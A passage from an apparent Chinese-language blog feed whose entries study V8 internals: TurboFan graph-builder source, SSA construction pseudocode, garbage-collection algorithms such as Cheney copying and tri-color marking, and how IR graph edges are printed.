NewNode(javascript()-&gt;StackCheck());</span><br><span class="line">  environment()-&gt;RecordAfterState(node, Environment::kAttachFrameState);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">void</span> BytecodeGraphBuilder::PrepareEagerCheckpoint() &#123;</span><br><span class="line">  <span class="keyword">if</span> (needs_eager_checkpoint()) &#123;</span><br><span class="line">    <span class="comment">// Create an explicit checkpoint node for before the operation. This only</span></span><br><span class="line">    <span class="comment">// needs to happen if we aren't effect-dominated by a &#123;Checkpoint&#125; already.</span></span><br><span class="line">    mark_as_needing_eager_checkpoint(<span class="literal">false</span>);</span><br><span class="line">    Node* node = NewNode(common()-&gt;Checkpoint());</span><br><span class="line">    DCHECK_EQ(<span class="number">1</span>, OperatorProperties::GetFrameStateInputCount(node-&gt;op()));</span><br><span class="line">    DCHECK_EQ(IrOpcode::kDead,</span><br><span class="line">              NodeProperties::GetFrameStateInput(node)-&gt;opcode());</span><br><span class="line">    BailoutId bailout_id(bytecode_iterator().current_offset());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> BytecodeLivenessState* liveness_before =</span><br><span class="line">        bytecode_analysis()-&gt;GetInLivenessFor(</span><br><span class="line">            bytecode_iterator().current_offset());</span><br><span class="line"></span><br><span class="line">    Node* frame_state_before = environment()-&gt;Checkpoint(</span><br><span class="line">        bailout_id, OutputFrameStateCombine::Ignore(), liveness_before);</span><br><span class="line">    NodeProperties::ReplaceFrameStateInput(node, frame_state_before);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// In case we skipped checkpoint creation above, we must be able to find an</span></span><br><span class="line">    <span class="comment">// existing checkpoint that effect-dominates the nodes about to be created.</span></span><br><span class="line">    <span class="comment">// Starting a search from the current effect-dependency has to succeed.</span></span><br><span class="line">    Node* effect = environment()-&gt;GetEffectDependency();</span><br><span class="line">    <span class="keyword">while</span> (effect-&gt;opcode() != IrOpcode::kCheckpoint) &#123;</span><br><span class="line">      DCHECK(effect-&gt;op()-&gt;HasProperty(Operator::kNoWrite));</span><br><span class="line">      DCHECK_EQ(<span class="number">1</span>, effect-&gt;op()-&gt;EffectInputCount());</span><br><span class="line">      effect = NodeProperties::GetEffectInput(effect);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li><p>VisitLdaNamedProperty</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Operator* JSOperatorBuilder::LoadNamed(Handle&lt;Name&gt; name,</span><br><span class="line">                                             <span class="keyword">const</span> VectorSlotPair&amp; feedback) &#123;</span><br><span class="line">  <span class="function">NamedAccess <span class="title">access</span><span class="params">(LanguageMode::kSloppy, name, feedback)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator1&lt;NamedAccess&gt;(           <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kJSLoadNamed, Operator::kNoProperties,  <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"JSLoadNamed"</span>,                                    <span class="comment">// name</span></span><br><span class="line">      <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>,                                 <span class="comment">// counts</span></span><br><span class="line">      access);                                          <span class="comment">// parameter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>VisitStar</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> BytecodeGraphBuilder::BuildCall(ConvertReceiverMode receiver_mode,</span><br><span class="line">                                     Node* <span class="keyword">const</span>* args, <span class="keyword">size_t</span> arg_count,</span><br><span class="line">                                     <span class="keyword">int</span> slot_id) &#123;</span><br><span class="line">  DCHECK_EQ(interpreter::Bytecodes::GetReceiverMode(</span><br><span class="line">                bytecode_iterator().current_bytecode()),</span><br><span class="line">            receiver_mode);</span><br><span class="line">  PrepareEagerCheckpoint();</span><br><span class="line"></span><br><span class="line">  VectorSlotPair feedback = CreateVectorSlotPair(slot_id);</span><br><span class="line"></span><br><span class="line">  CallFrequency frequency = ComputeCallFrequency(slot_id);</span><br><span class="line">  <span class="keyword">const</span> Operator* op =</span><br><span class="line">      javascript()-&gt;Call(arg_count, frequency, feedback, receiver_mode,</span><br><span class="line">                         GetSpeculationMode(slot_id));</span><br><span class="line">  JSTypeHintLowering::LoweringResult lowering = TryBuildSimplifiedCall(</span><br><span class="line">      op, args, <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(arg_count), feedback.slot());</span><br><span class="line">  <span class="keyword">if</span> (lowering.IsExit()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  Node* node = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (lowering.IsSideEffectFree()) &#123;</span><br><span class="line">    node = lowering.value();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    DCHECK(!lowering.Changed());</span><br><span class="line">    node = ProcessCallArguments(op, args, <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(arg_count));</span><br><span class="line">  &#125;</span><br><span class="line">  environment()-&gt;BindAccumulator(node, Environment::kAttachFrameState);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">const</span> Operator* JSOperatorBuilder::Call(<span class="keyword">size_t</span> arity, CallFrequency frequency,</span><br><span class="line">                                        VectorSlotPair <span class="keyword">const</span>&amp; feedback,</span><br><span class="line">                                        ConvertReceiverMode convert_mode,</span><br><span class="line">                                        SpeculationMode speculation_mode) &#123;</span><br><span class="line">  DCHECK_IMPLIES(speculation_mode == SpeculationMode::kAllowSpeculation,</span><br><span class="line">                 feedback.IsValid());</span><br><span class="line">  <span class="function">CallParameters <span class="title">parameters</span><span class="params">(arity, frequency, feedback, convert_mode,</span></span></span><br><span class="line"><span class="function"><span class="params">                            speculation_mode)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator1&lt;CallParameters&gt;(   <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kJSCall, Operator::kNoProperties,  <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"JSCall"</span>,                                    <span class="comment">// name</span></span><br><span class="line">      parameters.arity(), <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>,           <span class="comment">// inputs/outputs</span></span><br><span class="line">      parameters);                                 <span class="comment">// parameter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;总览&quot;&gt;&lt;a href=&quot;#总览&quot; class=&quot;headerlink&quot; title=&quot;总览&quot;&gt;&lt;/a&gt;总览&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span 
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>Building SSA Form</title>
    <link href="http://eternalsakura13.com/2018/09/02/ssa/"/>
    <id>http://eternalsakura13.com/2018/09/02/ssa/</id>
    <published>2018-09-02T11:47:20.854Z</published>
    <updated>2018-10-22T14:25:51.727Z</updated>
    
    <content type="html"><![CDATA[<ol><li>计算Dominator tree<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-02-122833.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-02-122907.jpg" alt=""></li><li>计算控制边界<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for all nodes, n, in the CFG</span><br><span class="line">    DF(n) &lt;- NULL</span><br><span class="line">for all nodes, n, in the CFG</span><br><span class="line">    if n has multiple predecessors then//必须有2个或2个以上的predecessors</span><br><span class="line">        for each predecessor p of n</span><br><span class="line">            runner &lt;- p</span><br><span class="line">            while runner != IDom(n)</span><br><span class="line">                DF(runner) &lt;- DF(runner) U &#123;n&#125;</span><br><span class="line">                runner &lt;- IDom(runner)</span><br></pre></td></tr></table></figure></li></ol><p>举例如下：<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-03-061548.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-03-061607.png" alt=""><br>最后得到Dominance Frontiers<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-03-061622.png" alt=""></p><p><strong>对于n的定义语句可以放置一个PHI函数在m处，如果</strong><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-03-061753.png" alt=""></p><ol><li>插入PHI函数<br>在真正插入PHI函数之前，我们需要在Dominance Frontiers的基础上，更精确的找到需要PHI函数的地方。</li></ol><p>“The basic idea is simple. A definition of x in block b forces a ϕ-function at every node in df(b).<br>Since that ϕ-function is a new definition of x, it may, in turn, force the insertion of additional ϕ-functions.”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for each name x∈ Globals</span><br><span class="line">    WorkList &lt;- Blocks(x)</span><br><span class="line">    for each block b∈ WorkList</span><br><span class="line">        for each block d in DF(b)</span><br><span class="line">            if d has no PHI function for x then </span><br><span class="line">                insert a PHI function for x in d</span><br><span class="line">                WorkList &lt;- WorkList U &#123;d&#125;</span><br></pre></td></tr></table></figure><p>对于每个global name x，算法将WorkList初始化为Blocks(x)。<br>对于WorkList上的每个block b，算法在b的支配边界(DF(b))中每个block d的起始处插入PHI函数。<br><strong>在向d中添加对应于x的PHI函数之后，算法将d添加到WorkList，以反映d中对x的新赋值操作</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-03-072211.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-03-072226.png" alt=""></p><ol><li>重命名变量的名字，满足SSA规则</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;计算Dominator tree&lt;br&gt;&lt;img src=&quot;https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-02-122833.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;htt
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>v8 GC</title>
    <link href="http://eternalsakura13.com/2018/09/01/v8_GC/"/>
    <id>http://eternalsakura13.com/2018/09/01/v8_GC/</id>
    <published>2018-08-31T16:05:52.331Z</published>
    <updated>2018-10-22T14:25:51.720Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="对象-头-域"><a href="#对象-头-域" class="headerlink" title="对象/头/域"></a>对象/头/域</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-071312.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-071357.png" alt=""></p><h3 id="mutator"><a href="#mutator" class="headerlink" title="mutator"></a>mutator</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-071247.png" alt=""></p><h3 id="根-root"><a href="#根-root" class="headerlink" title="根(root)"></a>根(root)</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-071052.png" alt=""></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="Cheney的GC复制算法"><a href="#Cheney的GC复制算法" class="headerlink" title="Cheney的GC复制算法"></a>Cheney的GC复制算法</h3><p>Cheney的GC复制算法不是递归地，而是迭代地进行复制。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">copying()&#123;</span><br><span class="line">    scan = $<span class="built_in">free</span> = $to_start </span><br><span class="line">    <span class="keyword">for</span>(r : $roots)</span><br><span class="line">        *r = copy(*r)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(scan != $<span class="built_in">free</span>) </span><br><span class="line">        <span class="keyword">for</span>(child : children(scan))</span><br><span class="line">            *child = copy(*child) </span><br><span class="line">        scan += scan.size</span><br><span class="line">    </span><br><span class="line">    swap($from_start, $to_start) &#125;</span><br></pre></td></tr></table></figure></p><p>在第2行将scan和<code>$free</code>的两个指针初始化。scan 是用于搜索复制完成的对象的指针。<code>$free</code>是指向分块开头的指针。<br>首先复制的是直接从根引用的对象，用到的是第3行和第4行。<br>在第6行到第9行搜索复制完成的对象，迭代复制其子对象。最后把From空间和 To空间互换就结束了。Cheney的GC复制算法中的关键点仍是copy()函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">copy(obj)&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_pointer_to_heap(obj.forwarding, $to_start) == FALSE)</span><br><span class="line">        copy_data($<span class="built_in">free</span>, obj, obj.size) obj.forwarding = $<span class="built_in">free</span></span><br><span class="line">        $<span class="built_in">free</span> += obj.size</span><br><span class="line">    <span class="keyword">return</span> obj.forwarding</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先在第2行检查参数obj是不是已经复制完毕了。<br>对于is_pointer_to_heap(obj.forwarding, $to_start)，如果 obj.forwarding 是指向To空间的指针则返回TRUE，如果不是(即非指针或指向From空间的指针)则返回FALSE。<br>在第3行复制对象，在第4行对forwarding指针进行设定。forwarding指针利用的是field1。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-31-163100.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-31-163127.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-31-163606.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-31-163619.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-31-163705.png" alt=""></p><h3 id="分代垃圾回收"><a href="#分代垃圾回收" class="headerlink" title="分代垃圾回收"></a>分代垃圾回收</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073113.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073126.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073138.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073154.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073202.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073212.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073225.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073241.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073249.png" alt=""></p><h4 id="Write-Barrier"><a href="#Write-Barrier" class="headerlink" title="Write Barrier"></a>Write Barrier</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073311.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073319.png" alt=""></p><h3 id="增量式垃圾回收（Incremental-GC）"><a href="#增量式垃圾回收（Incremental-GC）" class="headerlink" title="增量式垃圾回收（Incremental GC）"></a>增量式垃圾回收（Incremental GC）</h3><p>描述增量式垃圾回收的算法时我们有个方便的概念，那就是Edsger W. Dijkstra等人提出的三色标记算法(Tri-color marking)<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-070255.png" alt=""><br><strong>V8使用每个对象的两个mark-bits和一个标记工作栈来实现标记。两个mark-bits编码三种颜色：白色（00），灰色（10）和黑色（11）。</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072039.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072221.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072306.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072343.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072508.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072740.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072949.png" alt=""></p><h4 id="Write-Barrier-1"><a href="#Write-Barrier-1" class="headerlink" title="Write Barrier"></a>Write Barrier</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073355.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073441.png" alt=""></p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>V8 —— 你需要知道的垃圾回收机制<br><a href="https://juejin.im/post/5b398981e51d455e2c33136b" target="_blank" rel="noopener">https://juejin.im/post/5b398981e51d455e2c33136b</a></li><li>解读 V8 GC Log（二）: 堆内外内存的划分与 GC 算法<br><a href="https://yq.aliyun.com/articles/592880?spm=a2c4e.11153959.0.0.abf75fbdaPONjd" target="_blank" rel="noopener">https://yq.aliyun.com/articles/592880?spm=a2c4e.11153959.0.0.abf75fbdaPONjd</a></li><li>垃圾回收的算法和实现</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基本概念&lt;/h2&gt;&lt;h3 id=&quot;对象-头-域&quot;&gt;&lt;a href=&quot;#对象-头-域&quot; class=&quot;headerlink&quot; title=&quot;对象/头/
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
      <category term="GC" scheme="http://eternalsakura13.com/tags/GC/"/>
    
  </entry>
  
  <entry>
    <title>v8 IR连连看</title>
    <link href="http://eternalsakura13.com/2018/08/21/v8_graph/"/>
    <id>http://eternalsakura13.com/2018/08/21/v8_graph/</id>
    <published>2018-08-21T03:45:08.737Z</published>
    <updated>2018-10-22T14:39:55.617Z</updated>
    
    <content type="html"><![CDATA[<h2 id="v8-Graph"><a href="#v8-Graph" class="headerlink" title="v8 Graph"></a>v8 Graph</h2><p>首先说一个结论，v8的graph都是由下往上遍历。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-21-034849.png" alt=""><br>具体举一个例子,从json里随便提取一句<br><code>{&quot;source&quot;:0,&quot;target&quot;:13,&quot;index&quot;:3,&quot;type&quot;:&quot;control&quot;},</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-21-035048.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintEdges</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; node-&gt;InputCount(); i++) &#123;</span><br><span class="line">    Node* input = node-&gt;InputAt(i);</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">nullptr</span>) <span class="keyword">continue</span>;</span><br><span class="line">    PrintEdge(node, i, input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintEdge</span><span class="params">(Node* from, <span class="keyword">int</span> index, Node* to)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (first_edge_) &#123;</span><br><span class="line">    first_edge_ = <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    os_ &lt;&lt; <span class="string">",\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* edge_type = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (index &lt; NodeProperties::FirstValueIndex(from)) &#123;</span><br><span class="line">    edge_type = <span class="string">"unknown"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index &lt; NodeProperties::FirstContextIndex(from)) &#123;</span><br><span class="line">    edge_type = <span class="string">"value"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index &lt; NodeProperties::FirstFrameStateIndex(from)) &#123;</span><br><span class="line">    edge_type = <span class="string">"context"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index &lt; NodeProperties::FirstEffectIndex(from)) &#123;</span><br><span class="line">    edge_type = <span class="string">"frame-state"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index &lt; NodeProperties::FirstControlIndex(from)) &#123;</span><br><span class="line">    edge_type = <span class="string">"effect"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    edge_type = <span class="string">"control"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  os_ &lt;&lt; <span class="string">"&#123;\"source\":"</span> &lt;&lt; SafeId(to) &lt;&lt; <span class="string">",\"target\":"</span> &lt;&lt; SafeId(from)</span><br><span class="line">      &lt;&lt; <span class="string">",\"index\":"</span> &lt;&lt; index &lt;&lt; <span class="string">",\"type\":\""</span> &lt;&lt; edge_type &lt;&lt; <span class="string">"\"&#125;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>事实上反映到代码里，它是这样的。<br>也就是说,from对应node，input对应to。<br>画图的时候，source即to，target即from。<br><strong>注意这里的from和to到底指谁，在看代码的时候才不会迷失。</strong></p><p>以一个函数为例<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> GraphReducer::ReplaceWithValue(Node* node, Node* value, Node* effect,</span><br><span class="line">                                    Node* control) &#123;</span><br><span class="line">  <span class="keyword">if</span> (effect == <span class="literal">nullptr</span> &amp;&amp; node-&gt;op()-&gt;EffectInputCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (control == <span class="literal">nullptr</span> &amp;&amp; node-&gt;op()-&gt;ControlInputCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    control = NodeProperties::GetControlInput(node);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Requires distinguishing between value, effect and control edges.</span></span><br><span class="line">  <span class="keyword">for</span> (Edge edge : node-&gt;use_edges()) &#123;</span><br><span class="line">    Node* <span class="keyword">const</span> user = edge.from();</span><br><span class="line">    DCHECK(!user-&gt;IsDead());</span><br><span class="line">    <span class="keyword">if</span> (NodeProperties::IsControlEdge(edge)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (user-&gt;opcode() == IrOpcode::kIfSuccess) &#123;</span><br><span class="line">        Replace(user, control);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (user-&gt;opcode() == IrOpcode::kIfException) &#123;</span><br><span class="line">        DCHECK_NOT_NULL(dead_);</span><br><span class="line">        edge.UpdateTo(dead_);</span><br><span class="line">        Revisit(user);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        DCHECK_NOT_NULL(control);</span><br><span class="line">        edge.UpdateTo(control);</span><br><span class="line">        Revisit(user);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (NodeProperties::IsEffectEdge(edge)) &#123;</span><br><span class="line">      DCHECK_NOT_NULL(effect);</span><br><span class="line">      edge.UpdateTo(effect);</span><br><span class="line">      Revisit(user);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      DCHECK_NOT_NULL(value);</span><br><span class="line">      edge.UpdateTo(value);</span><br><span class="line">      Revisit(user);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>Edge edge : node-&gt;use_edges()<br>use_edges即图中的红色边。绿色边代表的是input，红色边代表use<br>这其实很好理解，如果我们来写一个双向图搜索，在设计的时候，每个节点肯定有进行前后遍历的两条边可以选择，v8也是这么设计的。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V8_EXPORT_PRIVATE</span> <span class="title">Node</span> <span class="title">final</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">InputEdges</span>;</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> InputEdges <span 